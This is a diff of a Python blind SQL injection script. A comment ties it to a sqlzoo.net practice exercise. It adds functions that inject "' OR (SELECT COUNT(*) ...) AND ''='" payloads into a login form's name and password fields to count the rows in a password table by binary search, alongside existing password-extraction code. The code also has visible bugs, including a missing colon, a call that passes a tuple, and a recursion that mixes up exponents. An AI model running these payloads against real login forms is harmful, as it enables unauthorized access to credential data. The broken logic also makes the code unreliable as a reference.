@@ -1,4 +1,5 @@
 import requests
+import math
 
 def checkPasswordCharacter(character, username, url, index = "no index"):
    """checks for character(s) at specified location in the password 
@@ -37,7 +38,7 @@ def checkPasswordCharacter(character, username, url, index = "no index"):
    """
    payload = constructPasswordPayload(character, username, index)
    query = sendQuery(payload, url)
-   return readQuery(query, username)
+   return readQuery(query)
 
 
 def sendQuery(payload, url):
@@ -62,7 +63,7 @@ def sendQuery(payload, url):
    r = requests.get(url, params = payload)
    return r.text
 
-def readQuery(query, username):
+def readQuery(query):
    """ reads the html returned by the query and determines if login was successful
 
    Args:
@@ -189,7 +190,110 @@ def testPassword(password, username, url):
 # https://sqlzoo.net/hack/20user.htm
 
 
-def nUsers()
+def nUsers(n, table, url):
+   """
+   returns the number of users in the password table, ie with login details
+
+   Args:
+      n: integer
+         will only check up to 2 raised to the nth power
+
+
+   Returns:
+      n: integer
+         returns number of users in password table
+
+   Raises:
+
+
+
+   """
+   if(n < 0): #base case
+      return 0 #either negative n in arg or less than one entry found
+   if(lessThanAEntries(2**n, table, url)): #recursive case
+      return nUsers(2**(n-1), table, url) #recursive call shrinks towards -1/2 (2**-1)
+   if(aEntries(2**n, table, url)) #base case
+      return 2**n 
+   else: #between n and 2n, so use binary search
+      return binarySearch(2**n, 2**(n+1), table, url)
+   
+   # I think it gets stuck if n is too small? Take the ceiling instead of using // in binarySearch?
+   
+
+def binarySearch(a, b, table, url):
+   """helper function.
+   searches range (n,2n) ((exlusive!))
+
+   a and b are end points of the search space
+
+   Let m be the inital a value 
+   Recall that m is 2 to the nth power for some integer n > 0.
+   By definition, m is an even integer.
+   It follows that m/2 = k for some integer k.
+   """
+   # n = (a + b)//2 # floor of the midpoint, ie integer division (// instead of / for float division)
+   n = math.ceil((a + b)/2)
+   if(lessThanAEntries((n, table, url))):
+      return binarySearch(a, n, table, url)
+   if(aEntries(n, table, url)):
+      return n #found it
+   if(n == b): # since n is not correct, and b is the larger end of this range, the n arg for nUsers is too small
+# could move this up to optimize network usage, since inital a and b will be checked already b4 binary search is started!
+      raise ValueError("Too many entries for given n. Need to use a bigger n!")
+   else:
+      return binarySearch(n, b, table, url)
+
+
+
+
+def lessThanAEntries(a, table, url):
+   """
+   returns true if less than a entries are in the table
+
+   Args:
+      a: integer
+
+      table: string
+         name of table
+
+      url: string
+         url of form
+
+   Returns
+      mhm: boolean
+         true if greater than a entries are found in table
+   
+   """
+
+   payload = "' OR (SELECT COUNT(*) FROM " + table + ") < " + str(a) + " AND ''='"
+   payload = {"name" : payload, "password" : payload}
+   txt = sendQuery(payload, url)
+   return readQuery(txt)
+
+
+def aEntries(a, table, url):
+   """
+   returns true if a entries are in the table
+
+   Args:
+      a: integer
+
+      table: string
+         name of table
+
+      url: string
+         url of form
+
+   Returns
+      mhm: boolean
+         true if exactly a entries are found in table
+   
+   """
+
+   payload = "' OR (SELECT COUNT(*) FROM " + table + ") = " + str(a) + " AND ''='"
+   payload = {"name" : payload, "password" : payload}
+   txt = sendQuery(payload, url)
+   return readQuery(txt)
 
 
 def userNameLike()
